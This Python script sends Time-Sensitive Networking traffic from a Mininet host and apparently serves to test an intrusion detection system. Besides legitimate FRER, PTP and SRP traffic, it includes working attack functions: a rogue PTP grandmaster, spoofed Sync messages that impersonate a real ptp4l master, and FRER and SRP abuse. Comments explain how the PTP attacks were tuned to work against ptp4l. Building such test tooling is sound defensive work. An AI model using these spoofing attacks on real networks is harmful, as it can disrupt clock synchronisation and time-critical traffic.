#!/usr/bin/env python3
# (C) 2026 Doganalp Ergenc, written with the assistance of Claude

"""Send frames from the interface of the Mininet host this runs on (needs Scapy: the venv's Python).

    send.py <command> [interface] [options]       interface defaults to $IFACE; `send.py commands` lists the commands

Legit traffic and attacks are separate commands; the options (--rate, --copies, ...) tune the legit ones.
The Ethernet source is replaced by the interface's address, except for `replay`.
"""
import argparse
import difflib
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from scapy.all import Ether, rdpcap, sendp  # noqa: E402
import gen_pcaps as g  # noqa: E402


REAL_MASTER = bytes.fromhex("000000fffe000001")       # ptp4l on h1 (MAC 00:00:00:00:00:01): MAC with ff:fe in the middle


def mac_of(iface):
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()


def send(iface, packets, gap=0.2, rewrite=True):
    """Send the frames `gap` seconds apart. With gap 0 they go out in one burst: every sendp() call opens a socket, which
    takes ~25 ms, long enough for a real master's Sync to fall between two frames that were meant to be back to back."""
    packets = list(packets)
    if rewrite:
        mac = mac_of(iface)
        for pkt in packets:
            pkt[Ether].src = mac
    if not gap:
        sendp(packets, iface=iface, verbose=False)
        return
    for pkt in packets:
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(gap)


def say(text):
    print(text, flush=True)


# ------------------------------------------------------------------ one-shot

def frer_mixed(iface, a):
    send(iface, [g.frer(s) for s in [1, 1, 2, 2, 3, 3, 4, 4, 4, 9]])


def srp_oversized_request(iface, a):
    send(iface, [g.talker_msg(a.uid, num=20, den=1, frames_=50, size=2000, rank=True)])


def ptp(iface, a):
    send(iface, [
        g.ptp(g.ptp_msg(0xB, g.announce_body(), seq=1)),
        g.ptp(g.ptp_msg(0x0, g.timestamp(), seq=2)),
        g.ptp(g.ptp_msg(0x8, g.timestamp(), seq=2)),
        g.ptp_udp(g.ptp_msg(0x0, g.timestamp(), seq=3, transport=0)),
        g.ptp_udp(g.ptp_msg(0xB, g.announce_body(), seq=4, transport=0), port=320),
    ])


def probe(iface, a):
    send(iface, [g.ptp(g.ptp_msg(0x0, g.timestamp(), seq=1)), g.frer(1)], gap=0.5)


# ------------------------------------------------------------------ continuous

def stream(iface, a):
    say(f"FRER stream on {iface}: {a.rate}/s, {a.copies} copies, vlan {a.vlan}, seq from {a.start} step {a.step}. Ctrl-C stops.")
    seq = a.start
    while True:
        send(iface, [g.frer(seq, vlan=a.vlan) for _ in range(a.copies)], gap=0)
        say(f"  seq {seq} x{a.copies}")
        seq = (seq + a.step) & 0xFFFF
        time.sleep(1 / a.rate)


def ptp_loop(iface, a):
    say(f"gPTP and PTP/UDP on {iface}: Sync + Follow_Up every second, Announce every 5 s. Ctrl-C stops.")
    seq = 0
    while True:
        frames = []
        if seq % 5 == 0:                                       # the Announce first: it introduces the master
            frames.append(g.ptp(g.ptp_msg(0xB, g.announce_body(), seq=seq // 5 + 1)))
        frames += [g.ptp(g.ptp_msg(0x0, g.timestamp(ns=seq), seq=seq)),
                   g.ptp(g.ptp_msg(0x8, g.timestamp(ns=seq), seq=seq)),
                   g.ptp_udp(g.ptp_msg(0x0, g.timestamp(ns=seq), seq=seq, transport=0))]
        send(iface, frames, gap=0.05)
        say(f"  sync {seq}")
        seq = (seq + 1) & 0xFFFF
        time.sleep(1)


def srp_normal(iface, a):
    send(iface, [g.talker_msg(a.uid, rank=True)])
    say(f"reservation {a.uid} sent")


def replay(iface, a):
    packets = rdpcap(a.pcap)
    say(f"{len(packets)} frames from {a.pcap}")
    previous = None
    for p in packets:
        if previous is not None:
            time.sleep(min(float(p.time - previous), a.max_gap))
        previous = p.time
        sendp(p, iface=iface, verbose=False)
    say("done")


# ------------------------------------------------------------------ attacks

def frer_excess_copies(iface, a):
    send(iface, [g.frer(seq, vlan=a.vlan) for seq in range(a.start, a.start + 6) for _ in range(3)], gap=0.1)


def frer_out_of_order(iface, a):
    send(iface, [g.frer(seq & 0xFFFF, vlan=a.vlan) for seq in range(a.start, a.start + 18, 3) for _ in range(2)], gap=0.1)


def srp_reservation_change(iface, a):
    send(iface, [g.talker_msg(a.uid, rank=True)], gap=0.5)
    send(iface, [g.talker_msg(a.uid, frames_=4, rank=True)])


# PTP attacks against a real ptp4l, and what it took for them to work:
#  - Announce: logMessageInterval must be 0 (1 s), not Sync's -3. ptp4l counts a foreign master's Announce messages
#    only inside a window of the announced interval, so with -3 the rogue was noticed but never a candidate.
#    It also wants a path trace TLV (802.1AS) and several Announce messages (six here).
#  - ptp_sequence_id: both frames in one burst. Every sendp() call takes ~25 ms, enough for a real Sync to fall in between.
#  - --clock real: ptp4l's identity, h1's MAC with ff:fe in the middle.

def ptp_rogue_grandmaster(iface, a):
    """A clock with a far better priority announces itself as grandmaster (domain 0)."""
    path_trace = g.tlv(0x0008, g.ROGUE)
    send(iface, [g.ptp(g.ptp_msg(0xB, g.announce_body(priority1=1, clock_class=6, identity=g.ROGUE) + path_trace,
                                 seq=n, clock=g.ROGUE, log_interval=0)) for n in range(1, 7)], gap=1.0)


def clock_of(a, default):
    """--clock: 16 hex digits, or `real` for the identity ptp4l derives from h1's MAC address (00:00:00:00:00:01)."""
    if a.clock is None:
        return default
    return REAL_MASTER if a.clock == "real" else bytes.fromhex(a.clock)


def ptp_unannounced_sync(iface, a):
    """Sync messages from a clock that never announced itself."""
    clock = clock_of(a, g.UNKNOWN)
    send(iface, [g.ptp(g.ptp_msg(0x0, g.timestamp(), seq=n, clock=clock)) for n in (1, 2, 3)], gap=0.3)


def ptp_sequence_id(iface, a):
    """Sync messages in the master's name with a sequenceId that jumps far ahead and is then repeated.

    The master is the one of `ptp_loop` unless --clock names another one."""
    clock = clock_of(a, g.CLOCK)
    send(iface, [g.ptp(g.ptp_msg(0x0, g.timestamp(), seq=1000, clock=clock)) for _ in range(2)], gap=0)


# name -> what it does; an attack command raises the IDS rule of the same name, plus the rules named after the text.
# `probe` is internal.
LEGIT = {
    "stream": "healthy FRER stream, 5 sequence numbers/s in 2 copies (Ctrl-C stops; --rate --copies --vlan ...)",
    "ptp_loop": "gPTP and PTP/UDP: Sync + Follow_Up every second, Announce every 5 s (Ctrl-C stops)",
    "ptp": "five PTP frames once: Announce, Sync, Follow_Up over Ethernet, Sync and Announce over UDP",
    "srp_normal": "one valid SRP reservation (--uid N)",
    "replay": "send the frames of a pcap with their original spacing: replay tests/pcaps/ids_srp.pcap",
}
ATTACKS = {
    "frer_excess_copies": ("three copies of every frame of a stream", ""),
    "frer_out_of_order": ("sequence numbers that jump ahead by 3", ""),
    "frer_mixed": ("extra copy, then a far-away sequence number, then silence",
                   "frer_excess_copies, frer_out_of_order, later frer_dead_stream"),
    "srp_oversized_request": ("a reservation over every threshold, with no stream behind it", "and later srp_unused_reservation"),
    "srp_reservation_change": ("the same reservation id requested twice", ""),
    "ptp_rogue_grandmaster": ("a clock with a better priority announces itself as grandmaster", ""),
    "ptp_unannounced_sync": ("Sync from a clock that never announced itself", ""),
    "ptp_sequence_id": ("Sync in the master's name with a sequenceId that jumps and repeats (--clock real: ptp4l's master)", ""),
}

SCENARIOS = {f.__name__: f for f in (
    stream, ptp_loop, ptp, srp_normal, replay, probe,
    frer_excess_copies, frer_out_of_order, frer_mixed, srp_oversized_request, srp_reservation_change, ptp_rogue_grandmaster, ptp_unannounced_sync, ptp_sequence_id)}


def listing(color=None):
    """The commands, legit and attacks apart (for the help text, the demo banner and error messages)."""
    color = sys.stdout.isatty() if color is None else color
    paint = (lambda code, text: f"\033[{code}m{text}\033[0m") if color else (lambda code, text: text)
    width = max(len(n) for n in list(LEGIT) + list(ATTACKS)) + 6          # "  tsn " + name
    lines = [paint("1;32", "LEGIT TRAFFIC")]
    lines += [paint("32", f"  tsn {n}".ljust(width)) + f" {text}" for n, text in LEGIT.items()]
    lines += ["", paint("1;31", "ATTACKS") + "  (each raises the IDS rule of the same name)"]
    lines += [paint("31", f"  tsn {n}".ljust(width)) + f" {text}" + (f"  -> {paint('31', rule)}" if rule else "")
              for n, (text, rule) in ATTACKS.items()]
    return "\n".join(lines)


class Parser(argparse.ArgumentParser):
    """Short errors instead of the full usage text."""

    def error(self, message):
        self.exit(2, f"tsn: {message}\n(`tsn --help` lists the commands and options)\n")


def fail(message):
    sys.exit(f"tsn: {message}")


def main():
    ap = Parser(prog="tsn", description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("scenario", help="the command, see above")
    ap.add_argument("interface", nargs="?", default=os.environ.get("IFACE"))
    ap.add_argument("--rate", type=float, default=5, help="stream: sequence numbers per second")
    ap.add_argument("--copies", type=int, default=2, help="stream: copies of each frame")
    ap.add_argument("--vlan", type=int, default=150, help="stream: VLAN id")
    ap.add_argument("--start", type=int, default=1, help="stream: first sequence number")
    ap.add_argument("--step", type=int, default=1, help="stream: sequence number increment")
    ap.add_argument("--uid", type=int, default=1, help="srp_*: stream unique id")
    ap.add_argument("--clock", help="ptp_sequence_id, ptp_unannounced_sync: clock identity as 16 hex digits, or `real` for the ptp4l master")
    ap.add_argument("--pcap", help="replay: the pcap")
    ap.add_argument("--max-gap", type=float, default=2.0, help="replay: longest pause between frames, seconds")
    ap.add_argument("--debug", action="store_true", help="show the traceback of an unexpected error")
    a = ap.parse_intermixed_args()          # options may come before the interface: `ptp_sequence_id --clock real h1-eth0`

    name = a.scenario.replace("-", "_")
    if name in ("commands", "help", "list"):
        print(listing())
        return
    if name not in SCENARIOS:
        close = difflib.get_close_matches(name, SCENARIOS, n=1)
        fail(f"invalid command {a.scenario!r}" + (f" - did you mean `tsn {close[0]}`?" if close else "")
             + f"\n\n{listing(False)}")
    a.scenario = name

    # `replay <pcap>` reads naturally: the pcap lands in `interface` unless that is an interface name.
    if name == "replay" and a.interface and a.interface.endswith(".pcap"):
        a.pcap, a.interface = a.interface, os.environ.get("IFACE")
    if not a.interface:
        fail("no interface (give one or set $IFACE)")
    if not os.path.exists(f"/sys/class/net/{a.interface}"):
        hint = ""
        if a.interface.replace("-", "_") in SCENARIOS:
            hint = f" ({a.interface} is a command: run one command at a time, `tsn {a.interface}`)"
        fail(f"{a.interface!r} is not an interface of this host{hint}; this host has: "
             f"{', '.join(sorted(os.listdir('/sys/class/net')))}")
    if name == "replay":
        if not a.pcap:
            fail("replay needs a pcap: tsn replay tests/pcaps/ids_srp.pcap")
        if not os.path.isfile(a.pcap):
            fail(f"no such pcap: {a.pcap}")
    if a.clock is not None and a.clock != "real":
        try:
            if len(bytes.fromhex(a.clock)) != 8:
                raise ValueError
        except ValueError:
            fail("--clock must be 16 hex digits or `real`")
    problems = [text for ok, text in (
        (a.rate > 0, "--rate must be positive"), (a.copies >= 1, "--copies must be at least 1"),
        (0 <= a.vlan <= 4095, "--vlan must be 0-4095"), (0 <= a.start <= 0xFFFF, "--start must be 0-65535"),
        (a.step >= 1, "--step must be at least 1"), (a.uid >= 0, "--uid must not be negative"),
        (a.max_gap >= 0, "--max-gap must not be negative")) if not ok]
    if problems:
        fail("; ".join(problems))

    try:
        SCENARIOS[name](a.interface, a)
    except KeyboardInterrupt:
        say("\nstopped")
    except PermissionError:
        fail("not permitted to send raw frames (run it inside a Mininet host, as root)")
    except Exception as e:                                  # a bad pcap, an interface that went down, ...
        if a.debug:
            raise
        fail(f"{type(e).__name__}: {e} (--debug shows the traceback)")


if __name__ == "__main__":
    main()
